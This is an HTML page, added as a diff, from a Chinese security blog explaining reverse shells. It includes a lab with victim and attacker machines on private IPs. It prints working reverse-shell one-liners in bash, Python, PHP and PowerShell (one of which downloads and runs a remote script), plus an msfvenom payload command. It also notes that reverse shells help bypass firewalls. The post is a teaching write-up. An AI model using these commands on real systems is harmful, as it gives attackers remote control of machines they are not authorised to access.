@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>反弹Shell | Wisejay | To be better</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="安全">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Wisejay</h5>
+          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>9</span>
+            
+              <span>3</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>反弹Shell</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">反弹Shell</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-01-08T06:29:47.869Z" itemprop="datePublished" class="page-time">
+  2021-01-08
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-反弹shell"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">反弹Shell</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-01-08 14:29:47" datetime="2021-01-08T06:29:47.869Z"  itemprop="datePublished">2021-01-08</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>反弹shell和telnet，ssh等标准shell对应，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</code></p>
+<p>反弹shell也可以理解为反向连接，我们日常所使用的telnet、ssh、远程桌面等服务都是正向连接(即我们主动去连接目标)，反弹shell就是让目标主动连接我们。</p>
+<p><strong>反弹shell好处</strong></p>
+<ul>
+<li>防火墙大多数都是防止外部连接内部，利用反弹shell我们可以让服务器从内部连接外部</li>
+<li>主动连接端口是固定，有可能被占用，反弹shell端口不固定</li>
+<li>反弹shell还有提升权限等好处</li>
+</ul>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><ul>
+<li><p>受害机centOs7：192.168.65.137</p>
+</li>
+<li><p>攻击机kali2020：192.168.65.148</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>攻击机开启端口监听</span><br><span class="line">nc -lvp 9999</span><br><span class="line"><span class="meta">#</span>nc指的是netcat</span><br><span class="line"><span class="meta">#</span>-l 是listen监听的作用</span><br><span class="line"><span class="meta">#</span>-v 用于输出交互的信息</span><br><span class="line"><span class="meta">#</span>-p 用于监听指定端口</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=反弹Shell href="img/%E5%8F%8D%E5%BC%B9shell/1609514196672.png" title="1609514196672" data-fancybox="images"><img src="img/%E5%8F%8D%E5%BC%B9shell/1609514196672.png" alt="1609514196672" title class></a>
+                <p>1609514196672</p>
+            </figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>受害机执行反弹命令(自动连接监听的端口)</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span>bash -i 用于产生一个交互的shell</span><br><span class="line"><span class="meta">#</span>/dev/tcp/ip/port 作用相当于建立一个sockt连接</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=反弹Shell href="img/%E5%8F%8D%E5%BC%B9shell/1609514612069.png" title="1609514612069" data-fancybox="images"><img src="img/%E5%8F%8D%E5%BC%B9shell/1609514612069.png" alt="1609514612069" title class></a>
+                <p>1609514612069</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=反弹Shell href="img/%E5%8F%8D%E5%BC%B9shell/1609514726946.png" title="1609514726946" data-fancybox="images"><img src="img/%E5%8F%8D%E5%BC%B9shell/1609514726946.png" alt="1609514726946" title class></a>
+                <p>1609514726946</p>
+            </figure>
+
+<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote>
+<ul>
+<li><p>&lt;  和  &gt;表示覆盖、&lt;&lt;  和  &gt;&gt;表示追加</p>
+</li>
+<li><p>0 - stdin 代表标准输入,默认是键盘,使用&lt;或&lt;&lt;</p>
+<ul>
+<li>1 - stdout 代表标准输出,默认是显示器,使用&gt;或&gt;&gt;</li>
+<li>2 - stderr 代表标准错误输出,默认是显示器,使用2&gt;或2&gt;&gt;</li>
+</ul>
+</li>
+<li><p>&amp;&gt;和&gt;&amp;作用一样就是混合输出(标准输出1 + 错误输出2)</p>
+<ul>
+<li>当后面接文件时，就会把标准输出和标准错误输出重定向至文件</li>
+<li>当后面接文件描述符时，就会将前面的文件描述符重定向至后面的文件描述符</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>了解上面内容之后我们再回顾前面<code>bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</code>中的<code>&amp;&gt;和0&gt;&amp;1</code>的作用</p>
+<ul>
+<li><p><code>&gt;&amp;</code>就是把标准输出和错误输出都直接重定向到<code>/dev/tcp/192.168.65.148/9999</code>即攻击机</p>
+</li>
+<li><p><code>0&gt;&amp;1</code>就是把输入的内容重定向到1，而前面<code>&gt;&amp;</code>已经把1内容重定向到<code>/dev/tcp/192.168.65.148/9999</code>,所以输入也重定向到攻击机</p>
+</li>
+<li><p>即把受害机输入和输出所有内容都直接由攻击机接管</p>
+</li>
+</ul>
+<h2 id="常用的反弹shell"><a href="#常用的反弹shell" class="headerlink" title="常用的反弹shell"></a>常用的反弹shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(( <span class="string">"192.168.65.148"</span>,<span class="number">9999</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([ <span class="string">"/bin/bash"</span> , <span class="string">"-i"</span> ])</span><br></pre></td></tr></table></figure>
+
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-ObjectSystem.Net.Webclient).DownloadString(<span class="string">'http://192.168.65.148/powercat.ps1'</span>); </span><br><span class="line"><span class="comment">#需要下载powercat设置好以下准备</span></span><br><span class="line">powercat -c ip_addr -p port -e cmd</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("192.168.65.148",9999);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure>
+
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.65.148 LPORT=9999 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h3><figure class="image-box">
+                <a rel=反弹Shell href="img/%E5%8F%8D%E5%BC%B9shell/1609518776337.png" title="1609518776337" data-fancybox="images"><img src="img/%E5%8F%8D%E5%BC%B9shell/1609518776337.png" alt="1609518776337" title class></a>
+                <p>1609518776337</p>
+            </figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2549#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549#toc-5</a></p>
+<p><a href="https://mp.weixin.qq.com/s/baVYUY1kEL0T8SprCX5N_Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/baVYUY1kEL0T8SprCX5N_Q</a></p>
+<p><a href="https://mp.weixin.qq.com/s/KbdCqujuOgfdbYsa7d3BLw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/KbdCqujuOgfdbYsa7d3BLw</a></p>
+<p><a href="https://blog.csdn.net/zhaominpro/article/details/82630528" target="_blank" rel="noopener">https://blog.csdn.net/zhaominpro/article/details/82630528</a></p>
+<p><a href="https://mp.weixin.qq.com/s/L5EcXCuohrjejbNV_MjDXw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/L5EcXCuohrjejbNV_MjDXw</a></p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2021-01-08T06:31:03.720Z" itemprop="dateUpdated">2021-01-08 14:31:03</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2021/01/08/反弹shell/" target="_blank" rel="external">http://wisejay.top/2021/01/08/反弹shell/</a>
+        
+    </div>
+    <footer>
+        <a href="http://wisejay.top">
+            <img src="/img/avatar.jpg" alt="Wisejay">
+            Wisejay
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2021/01/08/反弹shell/&title=《反弹Shell》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2021/01/08/反弹shell/&title=《反弹Shell》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2020/03/26/vue基础/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">vue基础</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#反弹Shell"><span class="post-toc-number">1.</span> <span class="post-toc-text">反弹Shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#实验"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">实验</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#说明"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">说明</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#常用的反弹shell"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">常用的反弹shell</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Bash"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">Bash</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Python"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">Python</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PowerShell"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">PowerShell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PHP"><span class="post-toc-number">1.4.4.</span> <span class="post-toc-text">PHP</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#MSF"><span class="post-toc-number">1.4.5.</span> <span class="post-toc-text">MSF</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Cobaltstrike"><span class="post-toc-number">1.4.6.</span> <span class="post-toc-text">Cobaltstrike</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#参考"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">参考</span></a></li></ol></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Wisejay &copy; 2019 - 2021
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2021/01/08/反弹shell/&title=《反弹Shell》 — Wisejay&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2021/01/08/反弹shell/&title=《反弹Shell》 — Wisejay&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABuklEQVR42u3ay2rEMAwF0P7/T6fbQhn3SrZMCserEJL4zCyEHv76itfzY63vfLpe3zm8cHFxt7nPcuXP/Iau6b3v4+Li3uR+ihjJlmt6NQj+YcPFxX0lt/pu/hfg4uL+X241GcpLKVxc3LdxE0Re0uTlzWCthouLu8HNu5Rz1yP9XVxc3Bb3Ka5qs6O3y8fdcXFxr3DzgJKPVPdbLet9cXFxp7m98eea2CulkgEMLi7uTW5ehOSIpNlaTYBwcXFvcpNE5Owgtldu4eLi3uHmic6pEWk+XIlqNVxc3DFuNa3pNVDOBkdcXNyb3KRhsdNOzX9wFMhwcXEHuL2Ephrs9u/j4uLe5OYbn6JUS6Ao7uLi4g5z88+dbaH2qhtcXNw57joY7TQ+8gFt8hYuLu59bnWskoB60PKQFRcXd4ybN0eqT1aTm6jUwcXFHeM+xZUnQNVGaqEmw8XFHeb2DmEk7Y9qc2RnkIOLizvBTYJXL6HZebeZ6ODi4h7l5oGmOiLtDVHKtREuLu4LuL0DGTtpEy4u7vu5vesDhzBwcXEvcqtHJ3vHs/a/gIuLe4fbqzh6CVCvfMLFxb3I/QYfg+IxL5Sa/wAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/haruto.model.json"},"display":{"position":"right","width":212,"height":472},"mobile":{"show":true},"log":false});</script></body>
+</html>
